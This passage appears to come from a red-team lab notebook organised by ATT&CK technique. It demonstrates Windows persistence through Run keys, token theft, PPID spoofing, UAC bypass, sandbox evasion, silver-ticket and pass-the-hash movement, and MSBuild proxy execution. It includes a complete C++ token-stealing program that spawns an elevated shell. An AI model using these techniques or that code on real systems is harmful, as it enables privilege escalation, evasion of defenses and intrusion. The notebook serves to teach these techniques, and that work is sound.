· HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices

· HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

· HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

· HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell subkeys can automatically launch programs.

Programs listed in the load value of the registry key

HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows run when any user logs on.

Be default, the multistring BootExecute value of the registry key

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.

**StartUp Folder:**

The startup folder as the name implies a folder containing programs that will initiate at Boot Time once a user has logged onto their session, we can apply this method to a single User or to All Users depending on the level of permissions we currently hold, in the following example I will just setup a simple BAT file on the startup folder for my current user and login back to the machine and have that file get executed once the user has logged on to the workstation.

Bat File

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhej-nUroV2ShXu2vz%2F-MRhel3hFJ-TnK8onNzn%2Fimage.png?alt=media&token=28883e86-c46e-4051-a558-f0bb2fe0f50c)

Home Startup Share View Name calc. bat Cete\Rcemin Date modified 7:37 PM renu\Steltu , Type Windows Batch File Size * Quick access Desktop Downloads

I placed a simple bat script on the startup menu so when the user logs back in this will get executed.

Demo:

**Registry Run Keys:**

From here we will also create a new Registry Key at User Level Permission and have it execute our code.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHsm8IuA-I8poix0h%2Fimage.png?alt=media&token=5d8c7bd5-b471-4a70-82d3-b5521a82cae0)

This code will get Execute every time a user logs in after every reboot or shutdown. We can see how it works in the following Demo.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHwynnEamF0PRk99t%2FRegistryKeyRun-Sample.gif?alt=media&token=19ead3f1-2ad0-406b-b981-bef78c18ee01)

## t1134-access-token-manipulation

Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. Administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.

Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.

### parent-pid-spoofing

Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.

Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child  process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within malicious Office document or any code that can perform Native API.

Explicitly assigning PPID mal also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (ie. Administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.

**Example:**

This technique was introduced  by Didier Stevesn. A proof of Concept was was written in C++ it was released to the public (SelectMyParent) that could allow the user to select the parent process by specifying the PID (process identifier). The "CreateProcess" function was used in conjunction with the "STARTUPINFOEX" and "LPROC_Thread_ATTRIBUTE_LIST".

Here is a sample of the Demo working

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhaD0K2qrRdc4_ZPcN%2F-MRhaJnQnu4Ki56x-Pep%2Fimage.png?alt=media&token=4dc3b538-fa9c-4069-b4b5-985000a77778)

As you can see the payload in now a child process of Firefox with the PID 2696.

We also have another tool from 

**Julian Horoszkiewics**

  which is based of the work of Didier and we can verify the same goal was reached when spoofing our Parent Process. This is achieved through the CreateProcess API

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhaD0K2qrRdc4_ZPcN%2F-MRhaKSEkbJNgN_OyigK%2Fimage.png?alt=media&token=b03d1dc9-2c36-4a37-93f9-e1979cd38182)

### make-and-impersonate-token

Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.

References:

Private Site

From Kekeo to Rubeus - harmj0y

harmj0y

Tenable.ad

Tenable®

Privilege Escalation Abusing Tokens

HackTricks

### create-process-with-token

Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with DuplicateToken(Ex) and use it with CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.

**Example:**

**In simple terms, this is when a token of an already exisiting accoes token present in one of the running processes on the victim host, is retrieved, duplicated and then used for creating a new process**

Step

Win32 API

Open a process with access token you want to steal

OpenProcess

Get a handle to the access token of that process

OpenProcesToken

Make a duplicate of the access token present in that process

DuplicateTokenEx

Create a new process with the newly aquired access token

CreateProcessWithTokenW

I will weaponize this technique using the following code:

**Code:**

1

#include "stdafx.h"

2

#include <windows.h>

3

#include <iostream>

4

 

5

int main(int argc, char * argv[]) {

6

char a;

7

HANDLE processHandle;

8

HANDLE tokenHandle = NULL;

9

HANDLE duplicateTokenHandle = NULL;

10

STARTUPINFO startupInfo;

11

PROCESS_INFORMATION processInformation;

12

DWORD PID_TO_IMPERSONATE = 3060;

13

wchar_t cmdline[] = L"C:\\shell.cmd";

14

ZeroMemory(&startupInfo, sizeof(STARTUPINFO));

15

ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));

16

startupInfo.cb = sizeof(STARTUPINFO);        

17

18

processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);

19

OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);

20

DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);                        

21

CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);

22

23

std::cin >> a;

24

    return 0;

25

}

Copied!

My target here is notepad as it is running with Administrator privileges and for the sake of demonstration purposes. Compiling the previous code with use the proper API calls to grab the token, duplicate it and open cmd prompt with Administrator privileges.

As you can see when running the compiled binary using PowerShell as the parent process of the ConsoleApplication running as the user but cmd process running as Administrator

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_TkEPzKdYoMfBZXx%2F-MRh_hwpynuOyH1FRnYe%2Fimage.png?alt=media&token=8f5df352-909a-4649-b7ea-6cf2f3889b45)

Create a Process with Token

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_TkEPzKdYoMfBZXx%2F-MRh_kBwacowMWvBavJ2%2Fimage.png?alt=media&token=3ad089e0-a223-4a93-bca6-e7692ada573a)

References:

Primary Access Token Manipulation

Red Teaming Experiments

### token-impersonation-theft

Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token.

An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.

**Example:**

PrintSpoofer.exe

Impersonate Privileges with a Named Pipe for this to work the tool tricks NT AUTHORITY\SYSTEM account into connecting and authenticating to an RPC server they control by leveraging some peculiarities of the Istorage COM interface. This exploit is well known by using the RottenPotato or RogueWinRm Exploits.

During the authentication process, all the messages are relayed between the client  - the SYSTEM account here - and a local NTLM negotiator. This negotiator is just a combination of several Windows API calls such as AcquireCredentialsHanlde() and AcceptSecurityContext() which interact with the lsass procces through ALPC. In the end if all goes well, you get SYSTEM.

Here I am as the current user with the privileges needed.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_5-1ameV03pC-f_z%2F-MRh_Bmz_oDJm7rcvtrm%2Fimage.png?alt=media&token=75a8c17f-d264-41e2-ac6d-7320ef22c5c0)

Then I move to using the PrintSpoofer exploit which will abuse the Print System Remote Protocol this is used with a tooled called SpoolSample the exploit is based on a single RPC call to a function exposed by the Print Spooler service.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_5-1ameV03pC-f_z%2F-MRh_C_2hbz-F0-tDvbU%2Fimage.png?alt=media&token=25262546-2819-4495-84e8-dfdf72a42295)

According to documentation, this function create a remote change notification object that monitors changes to printer objects and 

**send change notifications to a print client**

  using either RpcRouterReplyPinter or RpcRouterReplyPrinterEx.

But how are these notifications sent? "via ROC… 

**over a named pipe".**

 The thing here is that it communicates with a named pipe called "\pipe\spools" . 

**It4man**

 implements a trick on his PrintSpoofer tool to trick and control the path used by a server. With some slight adjustments we canc reate a server path and trick the RPC to communicate into a SYSTEM controlled pipe onto our controlled one and receive SYSTEM access.

**Path Manipulation**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_5-1ameV03pC-f_z%2F-MRh_LqsbPonDrC5TIip%2Fimage.png?alt=media&token=39106da9-2757-4c78-84df-54452cca8a6b)

As a prerequisite, 

**the only required privilege**

 is SeImpersonatePrivilege

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_5-1ameV03pC-f_z%2F-MRh_LDRHwqw_Hq2WM4W%2Fimage.png?alt=media&token=c79a9fdc-ae10-4f0f-a3eb-e8bbe52a4b8e)

Referenes:

Token Impersonation

DarthSidious

PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019 | itm4n's blog

We thought they were potatoes but they were beans (from Service Account to SYSTEM again)

Decoder's Blog

​

## t1548-abuse-elevation-control-mechanism

Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.

### bypass-user-account-control

Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact of the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional methods are regularly discovered and some used in the wild, such as:

·         Eventvwr.exe can auto-elevate and execute a specified binary or script.

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.

**Examples**

:

In the first example, why not DisableUAC for its entirety??. We can do this by changing the EnableUA Key and we won't receive prompts no more on anything that is executed with high privileges!!.

Warning: This will need Administrator Permissions. And this will prompt the user a warning that UAC will need a restart to turn it off

Once we apply the key we can simply restart the target machine and have it disabled

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhZoZ6wGW2icK2qWfC%2F-MRhZu0Czak_YWL2jQtV%2Fimage.png?alt=media&token=876c32e2-27e3-4d03-981d-1b06354fa92d)

And that's it anytime we execute a payload or anything that enables a prompt it won't use UAC it will simply execute. But this is a very noticeable feature, just demonstrating as it is very simple to use.

Let's try another attack

Fodhelper the great about this one is that we can work with User privileges and have it execute our payload.  In this example I will have it execute cmd with Administrator Privileges

Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10. Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhZoZ6wGW2icK2qWfC%2F-MRhZutA-QjxT1j1HW7v%2Fimage.png?alt=media&token=e0736176-2868-420a-b2c8-a8d816ef1d09)

# defense-evasion

The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries may also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics' techniques are cross-listed here when those techniques include the added benefit of subverting defenses.

## t1497-virtualization-sandbox-evasion

Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.

Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in a analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.

### time-based-evasion

Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.

Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.

**Example**

Ok so I won't put an example on this one but I will point you to an article that is great in explaining a recent attack (SolarWinds) as of time of writing this, in short what happened here the Malware waited for 2 weeks!!, before executing and running its malicious code to evade defenses, a legitimate software running normally without executing no malicious connections immediately like many others this one actually waited for 2 weeks. Take a good read at what happen as this one is great, just as mentioned before Tasks/Jobs are good for this demo.

References:

SolarWinds Hack Could Affect 18K Customers

briankrebs

SolarWinds hack: What we know, and don't know, so far

​

[Animated SolarWinds Breach Attack Flow - EP1](https://www.youtube.com/watch?v=b67Onrkj7PM)

### user-activity-based-checks

Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of check for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.

Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks, browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro or waiting for a user to double click on an embedded image to activate.

**Example**

In this example will be using all with user permission, of course we can grab more activity like logs, and registry info but these will require more elevated permissions from here we will just make sure the User has files in their Documents Folder, something above 10 files so we know that is a legitimate active user and not a recently created, in a virtual environment only used for Debuggers.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkb9pZPCZvBJtQdoXW%2F-MRkbAa7teZ0JIjuQqk8%2Fimage.png?alt=media&token=9ba325e2-73c8-4fd0-925f-adf051024398)

Above you see the code used in PowerShell to found the count of how many files are in the Documents Directory. If the count is above 8 then it will print out OK but if not then a simple NOPE will run instead.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkb9pZPCZvBJtQdoXW%2F-MRkbBAQoNPmhVvfeDgW%2Fimage.png?alt=media&token=c169bfb8-038d-404a-8101-ae258f9c70a5)

We see above that we have 8 Files in the Documents Directory just to verify this, so now by executing our script it should just print NOPE.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkb9pZPCZvBJtQdoXW%2F-MRkbBijmxjEVqm8HwLJ%2Fimage.png?alt=media&token=8aed3815-e04f-4483-836a-283e9d2d24aa)

Exactly as intended, this is another good method to evade systems as we verify if this is an actual working and active user for an environment that has working files or is at least active in a working environment folder which Documents, Downloads, Pictures are very common for employees.

### system-checks

Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.

Specific checks may will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a virtual environment.

Checks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size.

Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/products fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.

Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.

**Example**

In the following sample I will demonstrate a simple bat file that an adversary may create to do a simple System Check and if it finds a specific string 

**VirtualBox**

  it will terminate its execution but if not then it will continue and execute the malicious code.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkayX8m3RpWkPOCnBi%2F-MRkaz5cdz1PFvfV8ukP%2Fimage.png?alt=media&token=bfda5d9e-0d3c-4159-94b0-dd5499a45b3c)

Above you can see the simple scripting code, it will first run the 

**systeminfo**

 command, to grab all the information of the PC, it will save the info to a file and then will use the 

**findstr**

  command to search for certain strings in this case it will be 

  then by using 

**if/else**

 this will help that if the string is found then it will NOT execute, but if not found then it will continue its execution.

In the Demo here you can see that it search for the VirtualBox string, this technique can be moved to finding programs like Debuggers or Hardware to stop the execution of the script. This is a simple demo on how these techniques can be pushed to find even more checks and be aware that we aren't running in a virtual environment.

**Demo-SystemCheck:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkayX8m3RpWkPOCnBi%2F-MRkb0pcJukIwfAQe3nj%2FSystemChecks.gif?alt=media&token=0b14a507-c1b2-42ea-adfc-15d6298d2a8f)

## t1550-use-alternate-authentication-material

Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.

Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.

Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication material allows the system to verify an identity has successfully

### pass-the-ticket

Adversaries may 'pass the ticket' using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the Ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

In this technique, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending in the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.

Silver Ticket can be obtained for services that user Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).

Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.

**Example**

This demonstration will also cover Silver Tickets

Now on this scenario we have a share inaccessible by our domain user that we currently hold 

**DC\Dwinchester**

. But we are aware of another user that can.

**Jwinchester**

, this being since the users is part of the Data Engineers Group

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLPTwoqV4qsbpYnHJ%2Fimage.png?alt=media&token=7c3081b7-90ee-4246-9b14-019755963cbb)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLQvz7aWS-DsEcrVg%2Fimage.png?alt=media&token=1363438c-dc59-41c4-866a-757b2031b226)

And that folder has permissions for that user. We can see that our current user has no permissions to even check the

permissions itself.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLS8OcK41qWqNTA2O%2Fimage.png?alt=media&token=edc392b6-2332-4180-8ff5-d9d5754ee8ec)

Since it's a DB folder we try to search for a user that has DB permissions we already know this with Jwinchester.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLTIm-DORLsGhUcfK%2Fimage.png?alt=media&token=2946790c-ac06-42dd-8740-9940bf5ee69d)

John is the perfect candidate, now let's get a ticket for this account. We will use a tool to grab SPNs

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLUFAGrnUG-aFXorF%2Fimage.png?alt=media&token=1e83c8f7-6fd3-40ff-95f1-3e98ca349ab5)

And Request the Ticket

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLVHWfoMeBg-zyZt9%2Fimage.png?alt=media&token=5dbca13a-8821-4bce-8e24-08e4f6621a06)

We will then export the tickets and crack them offline. Crack the ticket and convert it to an NTLM Hash for Demo purposes this is already done.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLX4aMAsIvJj7QFYd%2Fimage.png?alt=media&token=d61b1a74-72e3-4dcf-8ff5-3d7609e2ebe9)

Create the Silver Ticket

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLY5yPicBOKJsxX9F%2Fimage.png?alt=media&token=1091921c-f263-4eb1-8972-552247dbdfb5)

And remember the share we had no access too?. We can now enumerate the files on the Share

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MSWLMhdod3w_bh_XElq%2F-MSWLZEMrDvk6md6JuTT%2Fimage.png?alt=media&token=a892a63c-9be3-4bd9-abe6-267ac22904aa)

References:

What is a Silver Ticket Attack? - Forged Service Tickets

Attack Catalog

Downloads

Directory Services Internals

How Attackers Use Kerberos Silver Tickets to Exploit Systems

Active Directory Security

​

### pass-the-hash

Adversaries may "pass the hash" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.

**Example**

Let's start by showing why this is a great technique for Defense Evasion the most secure thing available is at the Boot up of the Screen.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkaSOndkrRMpAiKGnB%2F-MRkaZpJNyIM5k-cfxXa%2Fimage.png?alt=media&token=5dae7c3c-0772-4e48-9dd0-94ea8de0875f)

Now how can we avoid this part without having the cleartext password of the User and avoiding any login screens, and prompts all the good stuff that might give us away?.

By passing the Hash this is a great technique that will authenticate silently and even when creating a Log it will throw an ID Log 4624

In this Demo will use PSEXEC it's great for this sample and it allows authentication with hashes. (You must already have a hash here, be creative, mimikatz, crackmap, lsassy.)

PsExec

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkaSOndkrRMpAiKGnB%2F-MRkaa2njiw9EnZW_olB%2Fimage.png?alt=media&token=aa089b9f-9d95-4701-a9ff-ec8dcb24fdbb)

In the above image the authentication using Hashes has been successful be wary that there are some requirements for this to work for example a share with Administrative Access has to be available and the 

**LocalAccountTokenPolicy**

 Registry Key needs to be set at a Value of 1.

This topic is very extensive and there are many tools that can help with this 

**CrackMapExec, SMBExec, WmiExec, Lsassy**

.

And others do please try and experiment and see what is being left behind, maybe a file?, a log?. When we use PsExec from Sysinternals it leaves a Registry Key when accepting the EULA but what about PsExec.py??.

References:

​

[https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/](https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/)

## t1127-trusted-developer-utilities-proxy-execution

Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.

### msbuild

Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.

Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.

**Example**

In this Demo MSBuild is a proper tool for executing code specially C# inserted in an XML project file. MSBuild will compile and execute the inline task.

By searching the Binary in its path or using the Developer Command Prompt we can execute the payload by passing the full path as a parameter 

**in this demo the payload is on the target machine for demonstration purposes, the utility is proxy aware so a payload can be called from a remote host**

.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_ycLdQbTW4r85oYQ%2F-MRka3-MbCozahH4op_F%2Fimage.png?alt=media&token=2b384592-5960-462f-a3d6-60aa5800dc27)

We see the execution and lets verify a shell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_ycLdQbTW4r85oYQ%2F-MRka3eznBdQIx-8Or2v%2Fimage.png?alt=media&token=618c9ca1-17d4-43ee-8e61-800d2080b640)

We view from Process Explorer that MSBuild is a child process and being called

